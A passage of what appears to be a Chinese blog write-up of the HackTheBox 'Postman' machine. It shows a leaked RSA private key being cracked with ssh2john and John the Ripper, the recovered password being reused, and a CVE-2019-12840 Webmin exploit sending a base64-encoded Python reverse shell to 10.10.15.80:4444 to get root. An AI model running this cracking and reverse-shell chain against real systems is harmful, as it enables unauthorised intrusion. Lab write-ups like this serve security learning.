class="line">WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh</span><br><span class="line">KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm</span><br><span class="line">npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ</span><br><span class="line">VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W</span><br><span class="line">X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw==</span><br><span class="line">-----END RSA PRIVATE KEY-----</span><br></pre></td></tr></table></figure></p>
+<p><strong>ssh2john转换为john格式</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ python /usr/share/john/ssh2john.py postman.id_rsa &gt; postman.id_rsa.hash</span><br><span class="line"></span><br><span class="line">$ cat postman.id_rsa.hash</span><br><span class="line">postman.id_rsa:<span class="variable">$sshng</span><span class="variable">$0</span><span class="variable">$8</span><span class="variable">$73E9CEFBCCF5287C</span><span class="variable">$1192</span><span class="variable">$25e840e75235eebb0238e56ac96c7e0bcdfadc8381617435d43770fe9af72f6036343b41eedbec5cdcaa2838217d09d77301892540fd90a267889909cebbc5d567a9bcc3648fd648b5743360df306e396b92ed5b26ae719c95fd1146f923b936ec6b13c2c32f2b35e491f11941a5cafd3e74b3723809d71f6ebd5d5c8c9a6d72cba593a26442afaf8f8ac928e9e28bba71d9c25a1ce403f4f02695c6d5678e98cbed0995b51c206eb58b0d3fa0437fbf1b4069a6962aea4665df2c1f762614fdd6ef09cc7089d7364c1b9bda52dbe89f4aa03f1ef178850ee8b0054e8ceb37d306584a81109e73315aebb774c656472f132be55b092ced1fe08f11f25304fe6b92c21864a3543f392f162eb605b139429bb561816d4f328bb62c5e5282c301cf507ece7d0cf4dd55b2f8ad1a6bc42cf84cb0e97df06d69ee7b4de783fb0b26727bdbdcdbde4bb29bcafe854fbdbfa5584a3f909e35536230df9d3db68c90541d3576cab29e033e825dd153fb1221c44022bf49b56649324245a95220b3cae60ab7e312b705ad4add1527853535ad86df118f8e6ae49a3c17bee74a0b460dfce0683cf393681543f62e9fb2867aa709d2e4c8bc073ac185d3b4c0768371360f737074d02c2a015e4c5e6900936cca2f45b6b5d55892c2b0c4a0b01a65a5a5d91e3f6246969f4b5847ab31fa256e34d2394e660de3df310ddfc023ba30f062ab3aeb15c3cd26beff31c40409be6c7fe3ba8ca13725f9f45151364157552b7a042fa0f26817ff5b677fdd3eead7451decafb829ddfa8313017f7dc46bafaac7719e49b248864b30e532a1779d39022507d939fcf6a34679c54911b8ca789fef1590b9608b10fbdb25f3d4e62472fbe18de29776170c4b108e1647c57e57fd1534d83f80174ee9dc14918e10f7d1c8e3d2eb9690aa30a68a3463479b96099dee8d97d15216aec90f2b823b207e606e4af15466fff60fd6dae6b50b736772fdcc35c7f49e5235d7b052fd0c0db6e4e8cc6f294bd937962fab62be9fde66bf50bb149ca89996cf12a54f91b1aa2c2c6299ea9da821ef284529a5382b18d080aaede451864bb352e1fdcff981a36b505a1f2abd3a024848e0f3234ef73f3e2dda0dd7041630f695c11063232c423c7153277bbe671cb4b483f08c266fc547d89ff2b81551dabef03e6fd968a67502100111a7022ff3eb58a1fc065692d50b40eb379f155d37c1d97f6c2f5a01de13b8989174677c89d8a644758c071aea8d4c56a0374801732348db0b3164dcc82b6eaf3eb3836fa05cf5476258266a30a531e1a3132e11b944e8e0406cad59ffeaecc1ab3b7705db99353c458dc9932a638598b195e25a14051e414e20dc1510eb476a467f4e861a51036d453ea96721e0be34f4993a34b778d4111b29a63d69c1b8200869a129392684af8c4daa32f3d0a0d17c36275f039b4a3bf29e9436b912b9ed42b168c47c4205dcd00c114da8f8d82af761e69e900545eb6fc10ef1ba4934adb6fa9af17c812a8b420ed6a5b645cad812d394e93d93ccd21f2d444f1845d261796ad055c372647f0e1d8a844b8836505eb62a9b6da92c0b8a2178bad1eafbf879090c2c17e25183cf1b9f1876cf6043ea2e565fe84ae473e9a7a4278d9f00e4446e50419a641114bc626d3c61e36722e9932b4c8538da3ab44d63</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>破解id_rsa文件，获得id_rsa文件的密码：computer2008</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">root@owefsad:~<span class="comment"># john --format=SSH --wordlist=/usr/share/wordlists/rockyou.txt postman.id_rsa.john</span></span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])</span><br><span class="line">Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 1 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Cost 2 (iteration count) is 2 <span class="keyword">for</span> all loaded hashes</span><br><span class="line">Will run 2 OpenMP threads</span><br><span class="line">Note: This format may emit <span class="literal">false</span> positives, so it will keep trying even after</span><br><span class="line">finding a possible candidate.</span><br><span class="line">Press <span class="string">'q'</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">computer2008     (postman.id_rsa)</span><br><span class="line">1g 0:00:00:12 DONE (2020-01-19 01:55) 0.07968g/s 1142Kp/s 1142Kc/s 1142KC/sa6_123..*7¡Vamos!</span><br><span class="line">Session completed</span><br></pre></td></tr></table></figure></p>
+<h4 id="User-Matt"><a href="#User-Matt" class="headerlink" title="User:Matt"></a>User:Matt</h4><p>1.使用账号密码：Matt computer2008登陆ssh，失败，<br>2.通过redis用户切换至Matt用户，成功；<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">redis@Postman:~$ su Matt</span><br><span class="line">Password:</span><br><span class="line">Matt@Postman:/var/lib/redis$ sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> Matt:</span><br><span class="line">Sorry, user Matt may not run sudo on Postman.</span><br><span class="line">Matt@Postman:/var/lib/redis$ <span class="built_in">cd</span></span><br><span class="line">Matt@Postman:~$ ls</span><br><span class="line">user.txt</span><br><span class="line">Matt@Postman:~$ cat user.txt</span><br><span class="line">517ad0ec2458ca97af8d93aac08a2f3c</span><br></pre></td></tr></table></figure></p>
+<h4 id="Priv-root"><a href="#Priv-root" class="headerlink" title="Priv: root"></a>Priv: root</h4><p>利用账号：Matt computer2008登陆webmin，通过webmin的”‘Package Updates’ Remote Command Execution”漏洞执行系统命令，获取反弹shell；<br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 获取反弹shell</span></span><br><span class="line">$ python CVE-2019-12840.py -u https://10.10.10.160 -U Matt -P computer2008 -lhost 10.10.15.80 -lport 4444</span><br><span class="line"></span><br><span class="line">  _______      ________    ___   ___  __  ___        __ ___   ___  _  _    ___</span><br><span class="line"> / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \      /_ |__ \ / _ \| || |  / _ \</span><br><span class="line">| |     \ \  / /| |__ ______ ) | | | || | (_) |______| |  ) | (_) | || |_| | | |</span><br><span class="line">| |      \ \/ / |  __|______/ /| | | || |\__, |______| | / / &gt; _ &lt;|__   _| | | |</span><br><span class="line">| |____   \  /  | |____    / /_| |_| || |  / /       | |/ /_| (_) |  | | | |_| |</span><br><span class="line"> \_____|   \/   |______|  |____|\___/ |_| /_/        |_|____|\___/   |_|  \___/</span><br><span class="line"></span><br><span class="line">                           by KrE80r</span><br><span class="line"></span><br><span class="line">             Webmin &lt;= 1.910 RCE (Authorization Required)</span><br><span class="line"></span><br><span class="line">usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -c <span class="string">"id"</span></span><br><span class="line">usage: python CVE-2019-12840.py -u https://10.10.10.10 -U matt -P Secret123 -lhost &lt;LOCAL_IP&gt; -lport 443</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">[*] logging <span class="keyword">in</span> ...</span><br><span class="line"></span><br><span class="line">[+] got sid 0cda096ebb0f458d4a0a34d7e5182659</span><br><span class="line"></span><br><span class="line">[*] sending <span class="built_in">command</span> python -c <span class="string">"import base64;exec(base64.b64decode('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjEwLjEwLjE1LjgwIiw0NDQ0KSk7b3MuZHVwMihzLmZpbGVubygpLDApOyBvcy5kdXAyKHMuZmlsZW5vKCksMSk7IG9zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQ=='))"</span></span><br></pre></td></tr></table></figure></p>
+<p><strong>获得root shell</strong><br><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 4444</span><br><span class="line">/bin/sh: 0: can<span class="string">'t access tty; job control turned off</span></span><br><span class="line"><span class="string"># cd /root</span></span><br><span class="line"><span class="string"># ls</span></span><br><span class="line"><span class="string">redis-5.0.0</span></span><br><span class="line"><span class="string">root.txt</span></span><br><span class="line"><span class="string"># cat root.txt</span></span><br><span class="line"><span class="string">a257741c5bed8be7778c6ed95686ddce</span></span><br></pre></td></tr></table></figure></p>
+<p>拿到root权限。</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Crack-id-rsa/" rel="tag"># Crack id_rsa</a>
+          
+            <a href="/tags/redis-4-0-9/" rel="tag"># redis 4.0.9</a>
+          
+            <a href="/tags/backup-file/" rel="tag"># backup file</a>
+          
+            <a href="/tags/webmin-1-910/" rel="tag"># webmin 1.910</a>
+          
+            <a href="/tags/cve-2019-12840/" rel="tag"># cve-2019-12840</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2020/01/20/HTB-Linux-Traverxec/" rel="next" title="HTB Linux Traverxec">
+                <i class="fa fa-chevron-left"></i> HTB Linux Traverxec
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2020/02/23/HTB-Windows-Nest/" rel="prev" title="HTB Windows Nest">
+                HTB Windows Nest <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">owefsad</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">81</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">5</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">164</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/exexute" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:owefsad@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#信息收集"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#User-redis"><span class="nav-number">1.1.</span> <span class="nav-text">User:redis</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#User-Matt"><span class="nav-number">1.2.</span> <span class="nav-text">User:Matt</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Priv-root"><span class="nav-number">1.3.</span> <span class="nav-text">Priv: root</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">owefsad</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
